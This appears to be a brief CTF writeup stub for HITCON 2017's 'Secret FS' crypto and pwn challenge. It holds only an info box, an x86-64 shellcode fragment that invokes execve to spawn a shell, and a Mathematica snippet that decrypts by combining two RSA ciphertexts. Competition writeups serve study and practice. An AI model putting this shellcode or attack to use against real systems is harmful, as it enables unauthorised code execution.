---
title: "Hitcon2017 -- SecretFS Writeup"
categories:
  - Hitcon2017
tags:
  - CTF
  - pwn
  - crypto
---

<div class="notice--info">
<strong>Name</strong>: Secret FS<br>
<strong>Category</strong>: crypto, pwn<br>
<strong>Points</strong>: 196<br>
<strong>Solves</strong>: 69<br>
<strong>Given</strong>: <code>secretfs</code>
</div>


```assembly
	xor eax, eax
	mov rdi, rsp
	mov al, 0x3b
	syscall
```

```mathematica
dec[m_]:=FromCharacterCode@IntegerDigits[m,256];
dec@Mod[PowerMod[c1,39,n] ModularInverse[c2,n], n]
```
